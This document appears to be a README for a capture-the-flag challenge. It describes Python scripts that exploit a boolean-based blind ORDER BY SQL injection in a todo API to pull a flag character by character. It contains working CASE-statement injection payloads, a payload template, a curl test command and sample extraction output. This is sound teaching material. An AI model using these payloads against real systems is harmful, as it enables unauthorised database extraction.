# SQL Injection Exploit PoC Documentation

## Overview

This directory contains Python proof-of-concept (PoC) scripts that demonstrate exploitation of the ORDER BY SQL injection vulnerability in the Order 66 CTF challenge.

## Files

### 1. `exploit_poc.py` - Advanced Exploit
**Full-featured exploitation script with enhanced logging and error handling**

**Features:**
- ✅ Colored terminal output with progress indicators
- ✅ Comprehensive vulnerability testing
- ✅ Database enumeration capabilities  
- ✅ Robust error handling and retry logic
- ✅ Command-line argument parsing
- ✅ Detailed logging for educational purposes

**Usage:**
```bash
# Install dependencies
pip install -r requirements.txt

# Basic usage (default: http://localhost:8000)
python3 exploit_poc.py

# Custom target
python3 exploit_poc.py http://challenge.ctf.com

# Quiet mode
python3 exploit_poc.py --quiet

# Custom character set
python3 exploit_poc.py --charset "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"

# Help
python3 exploit_poc.py --help
```

### 2. `simple_exploit.py` - Basic Exploit
**Simplified version with minimal dependencies (only `requests`)**

**Features:**
- ✅ No external dependencies beyond `requests`
- ✅ Core exploitation logic only
- ✅ Easy to understand and modify
- ✅ Perfect for learning the technique

**Usage:**
```bash
# Basic usage
python3 simple_exploit.py

# Custom target
python3 simple_exploit.py http://challenge.ctf.com
```

### 3. `solution.py` - Original CTF Solution
**The original solution script created for the challenge**

## Vulnerability Details

### Attack Vector
- **Endpoint:** `GET /api/todos?sort=[PAYLOAD]`
- **Vulnerability Type:** ORDER BY SQL Injection
- **Technique:** Boolean-based blind injection
- **Method:** CASE statement conditional sorting

### Exploitation Process

1. **Connection Testing**
   - Verify target accessibility via `/api/health`
   - Confirm API is operational

2. **Vulnerability Detection**  
   - Test invalid column names for error responses
   - Compare boolean conditions for different sort orders

3. **Database Enumeration**
   - Confirm SQLite database
   - Check for `flags` table existence
   - Determine flag count

4. **Flag Extraction**
   - Determine flag length using binary search
   - Extract each character using character set iteration
   - Use CASE statements to create different sort orders

### Key SQL Payloads

```sql
-- Boolean condition test
(CASE WHEN 1=1 THEN created_at ELSE priority END)
(CASE WHEN 1=2 THEN created_at ELSE priority END)

-- Table existence check
(CASE WHEN (SELECT COUNT(*) FROM flags) >= 0 THEN created_at ELSE priority END)

-- Flag length determination
(CASE WHEN (SELECT LENGTH(flag_value) FROM flags LIMIT 1) = 34 THEN created_at ELSE priority END)

-- Character extraction
(CASE WHEN (SELECT SUBSTR(flag_value,1,1) FROM flags LIMIT 1)='S' THEN created_at ELSE priority END)
```

### Boolean Logic Detection

The scripts detect TRUE/FALSE conditions by comparing the ordering of returned todos:

- **TRUE condition:** Different sort order than baseline
- **FALSE condition:** Same sort order as baseline  
- **Baseline:** Always false condition `(CASE WHEN 1=2 THEN created_at ELSE priority END)`

## Expected Output

### Successful Exploitation
```
[INFO] Testing connection to target...
✅ Target is accessible: The Empire's systems are fully operational
[INFO] Testing for ORDER BY SQL injection vulnerability...
✅ Boolean-based blind injection confirmed!
[INFO] Enumerating database information...
✅ SQLite database confirmed
✅ Table 'flags' exists!
[INFO] Determining flag length...
✅ Flag length: 34 characters
[INFO] Extracting complete flag (34 characters)...
✅ Position 1: 'S' -> Current flag: S
✅ Position 2: 'K' -> Current flag: SK
...
✅ Position 34: '}' -> Current flag: SKYDAYS{SKYORDER_66_HAD_TO_EXECUTED}

🎉 EXPLOITATION SUCCESSFUL!
🏴 FLAG: SKYDAYS{SKYORDER_66_HAD_TO_EXECUTED}
✅ Flag format appears correct!
```

## Technical Notes

### Character Set
Default character set includes:
- Uppercase letters: `ABCDEFGHIJKLMNOPQRSTUVWXYZ`
- Digits: `0123456789`  
- Lowercase letters: `abcdefghijklmnopqrstuvwxyz`
- Special characters: `{}_-`

### Rate Limiting
Scripts include small delays between requests:
- Length detection: 100ms delays
- Character extraction: 50ms delays
- Prevents server overload and potential blocking

### Error Handling
- Connection timeouts (5-10 seconds)
- HTTP error handling
- JSON parsing error handling
- Graceful degradation on failures

## Customization

### Adding Characters to Character Set
```python
# Extend the character set
exploiter.charset = string.ascii_uppercase + string.digits + string.ascii_lowercase + "{}_-!@#$%"
```

### Adjusting Delays
```python
# Modify delay between requests
time.sleep(0.1)  # Increase for slower networks
```

### Custom Payloads
```python
# Modify the payload templates
payload = f"(CASE WHEN (SELECT SUBSTR(flag_value,{pos},1) FROM flags LIMIT 1)='{char}' THEN created_at ELSE priority END)"
```

## Troubleshooting

### Common Issues

**Connection Refused:**
- Ensure the backend server is running
- Check if port 8000 is accessible
- Verify firewall settings

**No Boolean Response Detected:**
- The challenge may not be set up correctly
- Try manual testing with browser
- Check if todos exist in the database

**Character Extraction Fails:**
- Extend the character set
- Check for special characters or encoding issues
- Verify the flag format

### Manual Testing

You can manually test payloads in the browser:
```
http://localhost:8000/api/todos?sort=(CASE WHEN 1=1 THEN created_at ELSE priority END)
```

Or with curl:
```bash
curl "http://localhost:8000/api/todos?sort=(CASE%20WHEN%201=1%20THEN%20created_at%20ELSE%20priority%20END)"
```

## Security Notes

⚠️ **These scripts are for educational purposes only:**
- Only use on systems you own or have explicit permission to test
- Do not use against production systems
- Responsible disclosure applies to any vulnerabilities found
- Rate limiting helps avoid disruption

## Learning Outcomes

After studying and running these scripts, you should understand:
- ORDER BY SQL injection techniques
- Boolean-based blind injection methodology
- CASE statement usage in SQL injection
- Character-by-character data extraction
- Automation of SQL injection attacks
- Detection techniques for different SQL injection types

---

*"Your training in the dark side of SQL injection is now complete."* - Darth Vader 🏴